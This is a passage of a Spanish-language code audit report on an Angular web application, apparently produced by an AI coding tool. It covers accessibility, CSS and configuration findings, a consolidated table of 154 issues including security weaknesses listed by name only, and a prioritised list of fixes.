- `apps/app/src/styles.scss:207` (jslAnimateOnScroll)
- `apps/app/src/app/features/home/home.scss:880` (keyframes fadeInDown, fadeInUp, scrollWheel, etc.)
- `apps/app/src/app/features/blog-detail/blog-detail.scss:532` (modalEnter)
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD (WCAG 2.3.3)

**Evidencia:**
```scss
[jslAnimateOnScroll] {
  opacity: 0;
  transform: translateY(30px);
  transition: opacity 0.6s ease-out, transform 0.6s ease-out;
  // Sin @media (prefers-reduced-motion: reduce) {}
}

@keyframes scrollWheel { ... }  // Animación infinita — sin prefers-reduced-motion
@keyframes scrollArrow { ... }  // Animación infinita — sin prefers-reduced-motion
```

**Justificación:** Ninguna de las animaciones del proyecto respeta `prefers-reduced-motion`. Los usuarios con mareos, epilepsia, síndrome vestibular o preferencias de reducción de movimiento experimentarán todas las animaciones (incluyendo las infinitas del scroll indicator). Las animaciones de movimiento del hero que duran 12 segundos son especialmente problemáticas. Violación WCAG 2.3.3.

---

## ACC-26 — Focus ring con `box-shadow` invisible en algunos contextos
**Archivo:** `apps/app/src/styles.scss`  
**Líneas:** 148–151  
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD (WCAG 2.4.7)

**Evidencia:**
```scss
:focus-visible {
  outline: none;
  box-shadow: var(--focus-ring); // rgba(var(--primary-rgb), 0.5) — 50% opacidad
}
```

**Justificación:** El focus ring global usa `box-shadow` en lugar de `outline`. `outline` es el mecanismo nativo del navegador para indicadores de foco y funciona correctamente con `overflow: hidden`. `box-shadow` puede no ser visible cuando el elemento está dentro de un contenedor con `overflow: hidden` (frecuente en tarjetas y sliders), o cuando el color del foco tiene contraste insuficiente. Eliminar `outline: none` y depender de un `box-shadow` semitransparente es arriesgado.

---

## ACC-27 — Texto ilegiblemente pequeño en múltiples componentes
**Archivos:** `home.scss`, `about-us.scss`, `blog-detail.scss`  
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD (WCAG 1.4.4)

**Evidencia:**
```scss
.insight-card__badge { font-size: 0.63rem; }   // ≈ 10.1px
.insight-card__tag   { font-size: 0.67rem; }   // ≈ 10.7px
.project-card__category { font-size: 0.64rem; } // ≈ 10.2px
.progress-ring__label   { font-size: 0.55rem; } // ≈ 8.8px — CRÍTICO
.stat-item__label       { font-size: 0.68rem; } // ≈ 10.9px
.section-eyebrow        { font-size: 0.68rem; } // ≈ 10.9px
```

**Justificación:** Múltiples elementos de interfaz tienen tamaños de fuente inferiores a 12px. El `.progress-ring__label` con `0.55rem` (≈8.8px) es prácticamente ilegible para usuarios con visión reducida. WCAG 1.4.4 requiere que el texto sea redimensionable hasta 200% sin pérdida de contenido; texto tan pequeño ya parte desde un nivel inaceptable.

---

## ACC-28 — Cursor override global en mobile elimina cursor: pointer en botones
**Archivo:** `apps/app/src/styles.scss`  
**Líneas:** 93–97  
**Severidad:** MEDIA  
**Categoría:** UX / CSS

**Evidencia:**
```scss
@media (max-width: 768px) {
  * {
    cursor: default !important;
  }
}
```

**Justificación:** Este override con `* { cursor: default !important }` en mobile elimina el `cursor: pointer` de botones y links, quitando la indicación visual de que son interactuables en tablets con stylus y Chromebooks. El selector `*` con `!important` es una práctica CSS extremadamente agresiva.

---

## ACC-29 — Touch targets por debajo de 44×44px (mínimo Apple HIG / WCAG 2.5.5)
**Archivos:** `home.scss`, `about-us.scss`  
**Severidad:** ALTA  
**Categoría:** RESPONSIVE / ACCESIBILIDAD

**Evidencia:**
```scss
.filter-pill         { min-height: 36px; }  // 8px bajo el mínimo
.testimonial-nav-btn { width: 42px; height: 42px; }  // 2px bajo el mínimo
.insights-nav-btn    { width: 40px; height: 40px; }  // 4px bajo el mínimo
```

**Justificación:** Los filter pills, botones de navegación de testimonios e insights tienen dimensiones táctiles por debajo del mínimo de 44×44px recomendado por Apple HIG, WCAG 2.5.5 (AAA) y Material Design. Usuarios con dificultades motoras o en movimiento tendrán dificultades para activarlos con precisión.

---

## ACC-30 — `::ng-deep` deprecado causando style bleeding
**Archivo:** `apps/app/src/app/features/home/home.scss`  
**Líneas:** 72–92, 871–877, 2358–2373  
**Severidad:** ALTA  
**Categoría:** CSS / UI

**Evidencia:**
```scss
::ng-deep jsl-picture {
  img { object-fit: cover; ... }
}
:host::ng-deep {
  .hero-slider .swiper-button-next,
  .hero-slider .swiper-button-prev { display: none !important; }
}
```

**Justificación:** `::ng-deep` está deprecado en Angular desde v7. Genera estilos globales que pueden filtrar hacia otros componentes con las mismas clases. El selector `::ng-deep jsl-picture img` sin restricción de host se aplica a todos los `jsl-picture` del DOM cuando el componente esté activo, no solo al de home. El uso de `!important` indica que ya hay conflictos de especificidad derivados de este anti-patrón.

---

## ACC-31 — `about-us.scss` importado en `careers.scss` genera CSS duplicado en el bundle
**Archivo:** `apps/app/src/app/features/careers/careers.scss`  
**Líneas:** 1–2  
**Severidad:** ALTA  
**Categoría:** CSS / RENDIMIENTO VISUAL

**Evidencia:**
```scss
@use '../about-us/about-us.scss';
```

**Justificación:** Con Angular ViewEncapsulation, `@use` de un archivo de componente desde otro componente puede generar CSS duplicado en el bundle final: `about-us.scss` se incluirá tanto en el chunk de `about-us` como en el de `careers`. Esta práctica también puede causar efectos no deseados de bleeding de estilos.

---

## ACC-32 — Z-index sin escala definida, valores excesivos
**Archivos:** `home.scss`, `blog-detail.scss`  
**Severidad:** MEDIA  
**Categoría:** CSS / UI

**Evidencia:**
```scss
// home.scss
z-index: 10;   // línea 701
z-index: 15;   // línea 844
z-index: 20;   // línea 754

// blog-detail.scss
z-index: 10000; // línea 510 (modal de comentarios)
z-index: 10000; // línea 545 (modal de share)
z-index: 9999;  // línea 849 (progress bar)
```

**Justificación:** Z-index dispersos sin un sistema de capas documentado. Los valores `9999`/`10000` pueden crear conflictos con librerías de terceros (reCAPTCHA enterprise, chat widgets). Debe definirse una escala con variables CSS: `--z-header: 100`, `--z-modal: 200`, `--z-toast: 300`.

---

## ACC-33 — Animaciones infinitas en scroll indicator sin `animation-play-state`
**Archivo:** `apps/app/src/app/features/home/home.scss`  
**Líneas:** 380–430  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO VISUAL / ACCESIBILIDAD

**Evidencia:**
```scss
.wheel { animation: scrollWheel 2s infinite; }
.arrow { animation: scrollArrow 2s infinite; animation-delay: 0.2s; }
```

**Justificación:** Dos animaciones CSS infinitas siguen ejecutándose en el thread del compositor aunque el elemento tenga `visibility: hidden` y `opacity: 0`. Consumen GPU innecesariamente. Debe usarse `animation-play-state: paused` cuando el indicador está oculto.

---

## ACC-34 — `<section>` Hero sin `aria-label` descriptivo en múltiples páginas
**Archivos:** `home.html`, `about-us.html`, `careers.html`, etc.  
**Severidad:** MEDIA  
**Categoría:** SEMÁNTICA_HTML / ACCESIBILIDAD

**Justificación:** Las secciones `<section>` necesitan un heading accesible (`<h2>` visible o `aria-label`) para que los usuarios de AT puedan navegar por landmarks. Varias secciones hero solo tienen `class="hero"` sin ninguna etiqueta accesible.

---

## ACC-35 — Schema.org Event con `background-image` CSS en lugar de `<img>`
**Archivo:** `apps/app/src/app/features/events/events.html`  
**Líneas:** 13–27  
**Severidad:** MEDIA  
**Categoría:** SEO / ACCESIBILIDAD

**Evidencia:**
```html
<article itemscope itemtype="https://schema.org/Event">
  <div class="event-image" [style.backgroundImage]="'url(' + event.image + ')'">
    <meta itemprop="image" [attr.content]="event.image">
  </div>
```

**Justificación:** La imagen del evento usa `background-image` CSS (sin alt text) con un `<meta itemprop="image">` oculto para el schema. Google puede ignorar `<meta itemprop>` dentro del body. Debe usarse `<img itemprop="image" [src]="event.image" [alt]="event.title">` para que tanto la accesibilidad como el schema funcionen correctamente.

---

---

# SECCIÓN V — CONFIGURACIÓN E INFRAESTRUCTURA

---

## CFG-01 — `.env.example` incompleto: faltan 9+ variables críticas documentadas
**Archivo:** `.env.example`  
**Severidad:** MEDIA  
**Categoría:** CONFIGURACIÓN

**Justificación:** El archivo documenta solo 6 variables pero el proyecto usa al menos 15+:
- `BREVO_API_KEY`, `BREVO_LIST_ID`, `BREVO_LIST_CONTACT_ID`
- `BREVO_LIST_ENTERPRISE_ID`, `BREVO_LIST_WHITEPAPER_ID`
- `SALES_ALERT_EMAIL`, `RECAPTCHA_SECRET_KEY`
- `CANONICAL_BASE_URL`, `GA_MEASUREMENT_ID`
- `GSC_VERIFICATION_TOKEN`, `CALENDLY_URL`
- `FEATURE_FLAGS`, `CLARITY_PROJECT_ID`
- `CANONICAL_HOSTS`, `BUILD_DATE`

Un desarrollador nuevo que clone el repositorio no sabrá qué variables configurar, lo que llevará a errores silenciosos o comportamientos inesperados en local.

---

## CFG-02 — Budgets de bundle aumentados en lugar de optimizar el bundle
**Archivo:** `apps/app/project.json`  
**Líneas:** 44–54 (diff)  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO

**Evidencia (del diff):**
```json
// ANTES:
"maximumWarning": "2MB",
"maximumWarning": "80kB",  // anyComponentStyle

// DESPUÉS:
"maximumWarning": "2.1MB",
"maximumWarning": "96kB",  // anyComponentStyle
```

**Justificación:** En lugar de investigar y corregir qué está causando que el bundle exceda los límites, se aumentaron los límites. Los presupuestos de bundle son salvaguardas de rendimiento. Aumentarlos silencia las advertencias sin resolver el problema raíz. Un componente con 96kB de CSS indica que hay CSS no encapsulado o duplicado que debe revisarse (relacionado con la importación `@use` de `about-us.scss` en `careers.scss`).

---

---

# APÉNDICE — TABLA CONSOLIDADA DE TODOS LOS HALLAZGOS

| ID | Severidad | Área | Archivo | Descripción breve |
|----|-----------|------|---------|-------------------|
| SEG-01 | CRÍTICA | Seguridad | contact.service.ts:159 | XSS en correo HTML — campos sin escapar |
| SEG-02 | CRÍTICA | Seguridad | mail.service.ts:58 | XSS en correo SMTP — message sin escapar |
| SEG-03 | CRÍTICA | Seguridad | safe-url.pipe.ts:11 | bypassSecurityTrustResourceUrl sin validación |
| SEG-04 | CRÍTICA | Seguridad | clarity.service.ts:55 | projectId interpolado en innerHTML de script |
| SEG-05 | ALTA | Seguridad | meta-pixel.service.ts:53 | pixelId interpolado en innerHTML de script |
| SEG-06 | ALTA | Seguridad | api/main.ts | CSRF ausente en todos los endpoints POST |
| SEG-07 | ALTA | Seguridad | api/main.ts | CORS no configurado explícitamente |
| SEG-08 | ALTA | Seguridad | server.ts:394 | Endpoint /seo/health sin autenticación |
| SEG-09 | ALTA | Seguridad | server.ts:464 | CSP con 'unsafe-inline' neutralizada |
| SEG-10 | ALTA | Seguridad | server.ts:82 | Rate limit 10,000 req/15min — inútil |
| SEG-11 | ALTA | Seguridad | contact.controller.ts:15 | newsletter endpoint sin DTO/validación |
| SEG-12 | MEDIA | Seguridad | contact.service.ts:21,71,126 | PII (emails) en logs del servidor |
| SEG-13 | MEDIA | Seguridad | api.service.ts:48,59 | PII (payload) en console.log del cliente |
| SEG-14 | MEDIA | Seguridad | server.ts:426 | Security headers ausentes en assets estáticos |
| SEG-15 | ALTA | Seguridad | ngsw-config.json:43 | Service Worker cachea POST /api/** |
| SEG-16 | MEDIA | Seguridad | data.controller.ts:14 | Slugs sin validación + 200 en lugar de 404 |
| SEG-17 | MEDIA | Seguridad | server.ts:489 | allowedHosts puede contener undefined |
| SEG-18 | ALTA | Arquitectura | api/data.service.ts:7 | Backend importa desde frontend (acoplamiento) |
| MEM-01 | ALTA | Memory Leak | direction.service.ts:25 | Suscripción onLangChange sin destruir |
| MEM-02 | ALTA | Memory Leak | personalization.service.ts:26 | Suscripción onLangChange sin destruir |
| MEM-03 | ALTA | Memory Leak | analytics.service.ts:265 | Suscripción router.events sin destruir |
| MEM-04 | ALTA | Memory Leak | attribution.service.ts:33 | Suscripción router.events sin destruir |
| MEM-05 | ALTA | Memory Leak | search-overlay.ts:28 | Subject sin completar, sin ngOnDestroy |
| MEM-06 | ALTA | Memory Leak | home.ts:479 | Suscripción onLangChange en comp destructible |
| MEM-07 | ALTA | Memory Leak | home.ts:963 | addEventListener con cleanup via subscribe |
| MEM-08 | MEDIA | Memory Leak | blog-detail.ts:229 | speechSynthesis no cancelado en destroy |
| MEM-09 | ALTA | Memory Leak | careers.ts:47 | Suscripción SEO sin destruir |
| MEM-10 | MEDIA | Memory Leak | analytics.service.ts:183 | PerformanceObserver sin disconnect() |
| MEM-11 | MEDIA | Memory Leak | analytics.service.ts:120 | Sentinel divs DOM sin limpiar al navegar |
| MEM-12 | MEDIA | Memory Leak | home.ts:893 | setTimeout externo sin referencia en social proof |
| RC-01 | MEDIA | Race Condition | language-init-guard.ts:70 | navigateByUrl imperativo en lugar de UrlTree |
| RC-02 | MEDIA | Race Condition | contact.ts:267 | Doble submit posible sin switchMap |
| RC-03 | MEDIA | Race Condition | language-suggestion.ts:36 | effect() con setTimeout crea múltiples timers |
| RC-04 | MEDIA | Race Condition | home.ts:730 | Swiper init con setTimeout(100) — doble init |
| BUG-01 | ALTA | Bug | blog-detail.ts:72 | @Inject + inject() combinados incorrectamente |
| BUG-02 | MEDIA | Bug | contact.ts:292 | navigate a /thank-you sin prefijo de idioma |
| BUG-03 | ALTA | Bug | contact.ts:320 | document accedido sin isPlatformBrowser (SSR) |
| BUG-04 | MEDIA | Bug | app.ts:188 | window accedido sin isPlatformBrowser (SSR) |
| BUG-05 | ALTA | Bug | click-outside.ts:17 | @HostListener document:click en SSR |
| BUG-06 | MEDIA | Bug | whitepaper-download.ts:79 | window.open sin guard SSR |
| BUG-07 | MEDIA | Bug | roi-calculator.ts:25 | monthly×12 ≠ annualSavings (cálculo incorrecto) |
| BUG-08 | ALTA | Bug | toast.service.ts:26 | setTimeout sin referencia, no cancelable |
| BUG-09 | MEDIA | Bug | personalization.service.ts:70 | Precedencia && vs || sin paréntesis |
| BUG-10 | MEDIA | Bug | analytics.service.ts:112 | Sentinels calculados antes del render dinámico |
| BUG-11 | BAJA | Bug | scroll-engine.ts:82 | getElementById no resuelve selectores CSS |
| BUG-12 | MEDIA | Bug | data.controller.ts:13 | undefined devuelto como HTTP 200 |
| BUG-13 | BAJA | Bug | contact.ts:148 | prefillKnownData establece referralSource a '' |
| BUG-14 | MEDIA | Bug | blog-detail.ts:101 | Comentarios mock sin persistencia real |
| BUG-15 | MEDIA | Bug | blog-detail.ts:275 | Texto hardcodeado en español (app 11 idiomas) |
| BUG-16 | MEDIA | Bug | app.ts:46 | isScrolled debe ser signal en zoneless |
| BUG-17 | BAJA | Bug | app.ts:327 | window.pageYOffset deprecated |
| BUG-18 | MEDIA | Rendimiento | app.ts:308 | scroll/resize sin debounce en comp raíz |
| BUG-19 | MEDIA | Rendimiento | app.config.ts:23 | 11 idiomas importados estáticamente |
| BUG-20 | BAJA | Práctica | about-us.ts:44 | @Inject redundante para servicios |
| BUG-21 | BAJA | Práctica | múltiples | Mezcla de 3 estilos de DI |
| BUG-22 | BAJA | Práctica | search-overlay.ts:39 | No declara implements AfterViewInit |
| BUG-23 | MEDIA | Práctica | seo.ts:108 | console.log en producción |
| BUG-24 | MEDIA | SEO/UX | app.html:5 | Breadcrumbs comentados sin documentar razón |
| BUG-25 | BAJA | UX | app.routes.ts:334 | Redirect a home genera doble historial |
| BUG-26 | BAJA | SEO | app.routes.server.ts:158 | thank-you prerenderizado pero noindex |
| BUG-27 | BAJA | SEO | server.ts:328 | Sitemap N veces más grande (N idiomas × rutas) |
| BUG-28 | MEDIA | Rendimiento | home.ts:1079 | getStars() crea Array en cada render |
| BUG-29 | BAJA | Rendimiento | seo.ts:389 | setResourceHints llamado en cada navegación |
| BUG-30 | ALTA | Rendimiento | server.ts:386 | Sitemap generado en cada petición sin caché |
| BUG-31 | MEDIA | Rendimiento | home.ts:501 | 1.5s de carga artificial degrada Core Web Vitals |
| BUG-32 | MEDIA | Rendimiento | contact.ts:150 | Analytics por cada keystroke sin debounce |
| BUG-33 | MEDIA | Rendimiento | data.service.ts | Sin caché en DataService (N llamadas duplicadas) |
| BUG-34 | BAJA | UX | video-modal.ts | No integra OverlayManagerService |
| BUG-35 | MEDIA | Práctica | data.service.ts:301 | Búsqueda global solo en mock data |
| ACC-01 | CRÍTICA | Accesibilidad | index.html | Sin "skip to main content" link |
| ACC-02 | CRÍTICA | Accesibilidad | home.html:480, whitepaper.html:67, 404.html:12 | Inputs sin label |
| ACC-03 | CRÍTICA | Accesibilidad | roi-calculator.html:13 | Inputs range sin asociación label→input |
| ACC-04 | CRÍTICA | Accesibilidad | múltiples modales | Sin role=dialog, aria-modal, ni focus trap |
| ACC-05 | ALTA | Accesibilidad | home.html:218 | <div> interactivo no accesible por teclado |
| ACC-06 | MEDIA | Accesibilidad | home.html:225 | Tabs sin roles ARIA de tablist/tab/tabpanel |
| ACC-07 | MEDIA | Accesibilidad | faq.html:63 | FAQs sin aria-controls ni IDs en paneles |
| ACC-08 | MEDIA | Accesibilidad | pagination.html:17 | Sin aria-current="page" en página activa |
| ACC-09 | MEDIA | Accesibilidad | skeleton-loader.html | Sin aria-busy ni aria-label de carga |
| ACC-10 | MEDIA | Accesibilidad | image-comparison.html:22 | aria-label hardcodeado en inglés |
| ACC-11 | ALTA | Accesibilidad | home.html:126 | Scroll indicator decorativo sin aria-hidden |
| ACC-12 | MEDIA | Accesibilidad | toast.html | Sin live region (role=alert/status/aria-live) |
| ACC-13 | MEDIA | Accesibilidad | contact.html:117 | Progress bar sin role=progressbar |
| ACC-14 | ALTA | Accesibilidad | contact.html:99 | Step indicator sin aria-current, texto en inglés |
| ACC-15 | CRÍTICA | UX | events.html:39 | Botón "Ver grabación" completamente no funcional |
| ACC-16 | ALTA | UX | events.html:23 | href="#" cuando no hay URL de registro |
| ACC-17 | MEDIA | Accesibilidad | pricing.html:151 | Tabla comparativa con <div> en lugar de <table> |
| ACC-18 | MEDIA | Accesibilidad | blog-detail.html:152 | Links autor solo con [title] sin aria-label |
| ACC-19 | MEDIA | Accesibilidad | home.html:356 | Filter pills sin aria-pressed |
| ACC-20 | MEDIA | Accesibilidad | digital-maturity.html | Progress bar madurez sin ARIA |
| ACC-21 | ALTA | Accesibilidad | product-detail.html:12 | Breadcrumbs sin ol/li ni aria-current |
| ACC-22 | ALTA | Accesibilidad | life-at-jsl.html:64 | Galería con mismo alt en todas las imágenes |
| ACC-23 | MEDIA | SEO | contact.html:313 | routerLink relativo que puede fallar |
| ACC-24 | MEDIA | Accesibilidad | social-share.html:62 | Copy link sin aria-live de confirmación |
| ACC-25 | ALTA | Accesibilidad | styles.scss:207, home.scss:880, blog-detail.scss:532 | prefers-reduced-motion no implementado |
| ACC-26 | ALTA | Accesibilidad | styles.scss:148 | Focus ring con box-shadow invisible en overflow:hidden |
| ACC-27 | ALTA | Accesibilidad | home.scss, about-us.scss | Texto <12px en múltiples componentes |
| ACC-28 | MEDIA | UX/CSS | styles.scss:93 | cursor:default !important en mobile |
| ACC-29 | ALTA | Responsive | home.scss | Touch targets <44px (filter pills, nav buttons) |
| ACC-30 | ALTA | CSS | home.scss:72 | ::ng-deep deprecado, style bleeding |
| ACC-31 | ALTA | CSS | careers.scss:1 | @use de componente ajeno genera CSS duplicado |
| ACC-32 | MEDIA | CSS | home.scss, blog-detail.scss | z-index sin escala, valores hasta 10000 |
| ACC-33 | MEDIA | Rendimiento | home.scss:380 | Animaciones infinitas sin animation-play-state |
| ACC-34 | MEDIA | Accesibilidad | múltiples | <section> sin aria-label descriptivo |
| ACC-35 | MEDIA | SEO | events.html:13 | Schema Event con background-image sin <img> |
| CFG-01 | MEDIA | Configuración | .env.example | 9+ variables de entorno no documentadas |
| CFG-02 | MEDIA | Rendimiento | project.json | Budgets de bundle aumentados en lugar de optimizar |

---

## PRIORIDADES DE CORRECCIÓN INMEDIATA (P0 — Esta semana)

1. **SEG-01 / SEG-02**: Sanitizar HTML en correos con función `escapeHtml()` — vulnerabilidad XSS activa
2. **SEG-03**: Añadir allowlist de dominios en `SafeUrlPipe` — XSS en iframes
3. **SEG-04 / SEG-05**: Validar `projectId` y `pixelId` con regex antes de insertar en `innerHTML`
4. **SEG-15**: Corregir `ngsw-config.json` para excluir endpoints POST de la caché del SW
5. **ACC-15**: Implementar o remover el botón "Ver grabación" — feature completamente roto
6. **MEM-05**: Añadir `ngOnDestroy` a `SearchOverlayComponent` y completar el Subject
7. **SEG-11**: Crear DTO con `@IsEmail()` para el endpoint de newsletter
8. **SEG-13**: Eliminar `console.log` con datos PII del `api.service.ts`

## PRIORIDADES ALTAS (P1 — Este sprint)

9. **ACC-04**: Implementar focus trap y atributos ARIA en todos los modales
10. **ACC-01**: Añadir "skip to main content" link en `index.html`
11. **ACC-25**: Añadir `@media (prefers-reduced-motion: reduce)` en todos los keyframes
12. **BUG-07**: Corregir `monthlySavings` para que sea consistente con `annualSavings`
13. **BUG-03 / BUG-05 / BUG-06**: Añadir guards de `isPlatformBrowser` donde falta
14. **SEG-10**: Revertir rate limit de 10,000 a ≤100 peticiones/15min para producción
15. **MEM-06**: Usar `takeUntil(this.destroy$)` en suscripción de Home a `onLangChange`

---

*Informe generado por análisis estático multi-agente — Claude Code*  
*Archivos analizados: 120+ | Problemas encontrados: 154 | Fecha: 2026-05-23*
